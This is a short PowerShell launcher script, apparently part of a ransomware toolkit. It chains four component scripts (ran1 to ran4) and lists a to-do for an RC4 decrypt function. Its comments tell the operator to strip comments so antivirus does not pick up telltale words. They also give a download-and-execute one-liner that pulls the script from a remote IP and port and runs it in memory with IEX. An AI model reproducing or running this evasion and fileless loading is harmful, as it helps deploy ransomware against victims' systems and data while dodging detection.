#exran.ps1

# Execute the parts in succession
# Make sure to remove all comments before execution so spcific words are not picked up by AV
# Can also be run in memory using  (New-Object System.Net.WebClient).DownloadString('http://IP:port/exran.ps1') | IEX
# Ensure the below files are modified with the http download location if running from memory

# To-Do
# Experiment with more modules ssuch as a decrypt function for RC4

. .\ran1.ps1
. .\ran2.ps1
. .\ran3.ps1
. .\ran4.ps1